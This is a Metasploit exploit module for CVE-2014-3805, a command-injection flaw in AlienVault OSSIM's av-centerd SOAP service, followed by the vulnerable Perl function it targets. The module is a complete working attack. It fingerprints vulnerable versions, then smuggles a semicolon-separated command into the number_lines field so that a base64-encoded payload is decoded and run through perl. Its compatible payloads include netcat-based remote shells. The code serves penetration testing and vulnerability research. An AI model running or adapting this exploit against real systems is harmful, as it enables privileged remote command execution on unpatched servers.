require 'msf/core'
require 'rexml/document'

class MetasploitModule < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::HttpClient
	include REXML

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Alienvault OSSIM av-centerd Command Injection get_log_line',
			'Description'	=> %q{
				This module exploits a command injection flaw found in the get_log_line
				function found within Util.pm. The vulnerability is triggered due to an
				unsanitized $r_file parameter passed to a string which is then executed
				by the system
			},
			'Author' => [ 'james fitts' ],
			'License' => MSF_LICENSE,
			'References' =>
				[
					[ 'CVE', '2014-3805' ],
					[ 'OSVDB', '107992' ]
				],
			'Privileged'	=> true,
			'Platform'		=> 'unix',
			'Arch'			=> ARCH_CMD,
			'DefaultOptions' =>
				{
					'SSL' => true,
				},
			'Payload' =>
				{
					'Compat'	=> {
						'RequiredCmd'	=> 'perl netcat-e openssl python gawk'
					}
				},
			'DefaultTarget'	=> 0,
			'Targets' =>
				[
					['Alienvault <= 4.7.0',{}]
				],
			'DisclosureDate' => 'Jul 18 2014'))

			register_options([Opt::RPORT(40007)], self.class)
	end

	def check
		version = ""
		res = send_soap_request("get_dpkg")

		if res &&
			res.code == 200 &&
			res.headers['SOAPServer'] &&
			res.headers['SOAPServer'] =~ /SOAP::Lite/ &&
			res.body.to_s =~ /alienvault-center\s*([\d\.]*)-\d/

			version = $1
		end

		if version.empty? || version >= "4.7.0"
			return Exploit::CheckCode::Safe
		else
			return Exploit::CheckCode::Appears
		end
	end

	def build_soap_request(method)
		xml = Document.new
		xml.add_element(
			"soap:Envelope",
			{
				"xmlns:xsi"				=> "http://www.w3.org/2001/XMLSchema-instance",
				"xmlns:soapenc"			=> "http://schemas.xmlsoap.org/soap/encoding/",
				"xmlns:xsd"				=> "http://www.w3.org/2001/XMLSchema",
				"soap:encodingStyle"	=> "http://schemas.xmlsoap.org/soap/encoding/",
				"xmlns:soap"			=> "http://schemas.xmlsoap.org/soap/envelope/"
			})

		body = xml.root.add_element("soap:Body")
		m = body.add_element(method, { 'xmlns'	=> "AV/CC/Util" })

		args = []
		args[0] = m.add_element("c-gensym3", {'xsi:type' => 'xsd:string'})
		args[0].text = "All"

		args[1] = m.add_element("c-gensym5", {'xsi:type' => 'xsd:string'})
		args[1].text = "423d7bea-cfbc-f7ea-fe52-272ff7ede3d2"

		args[2] = m.add_element("c-gensym7", {'xsi:type' => 'xsd:string'})
		args[2].text = "#{datastore['RHOST']}"

		args[3] = m.add_element("c-gensym9", {'xsi:type' => 'xsd:string'})
		args[3].text = "#{rand_text_alpha(4 + rand(4))}"

		args[4] = m.add_element("c-gensym11", {'xsi:type' => 'xsd:string'})
		args[4].text = "/var/log/auth.log"

		args[5] = m.add_element("c-gensym13", {'xsi:type' => 'xsd:string'})
		perl_payload =  "system(decode_base64"
		perl_payload += "(\"#{Rex::Text.encode_base64(payload.encoded)}\"))"
		args[5].text = "1;perl -MMIME::Base64 -e '#{perl_payload}';"

		xml.to_s
	end

	def send_soap_request(method, timeout=20)
		soap = build_soap_request(method)

		res = send_request_cgi({
			'uri'		=> '/av-centerd',
			'method'	=> 'POST',
			'ctype'		=> 'text/xml; charset=UTF-8',
			'data'		=> soap,
			'headers'	=> {
				'SOAPAction'	=> "\"AV/CC/Util##{method}\""
			}
		}, timeout)

		res
	end

	def exploit
		send_soap_request("get_log_line", 1)
	end
end
__END__

/usr/share/alienvault-center/lib/AV/CC/Util.pm

sub get_log_line {
        my ( $funcion_llamada, $nombre, $uuid, $admin_ip, $hostname, $r_file, $number_lines )
        = @_;

    verbose_log_file(
        "GET LOG LINE  : Received call from $uuid : ip source = $admin_ip, hostname = $hostname :($funcion_llamada,$r_file)"
    );

    my @ret = ("$systemuuid");

    if ( $r_file =~ /\.\./ ){
                        push(@ret,"File not auth");
                        return \@ret;
        }

        if ( $number_lines <= 0) {
                        push(@ret,"Error in number lines");
                        return \@ret;
        }

    if (( $r_file =~ /^\/var\/log\// ) or ( $r_file =~ /^\/var\/ossec\/alerts\// ) or ( $r_file =~ /^\/var\/ossec\/logs\// )){
                        if (! -f "$r_file" ){
                                push(@ret,"File not found");
                                return \@ret;
                        }
                        push(@ret,"ready");

                        my $command = "tail -$number_lines $r_file";
                        #push(@ret,"$command");
                        #my @content = `tail -$number_lines $r_file`;
                        my @content = `$command`;
                        push(@ret,@content);
                        return \@ret;
        }
    else {
                push(@ret,"path not auth");
                return \@ret;
        }
}

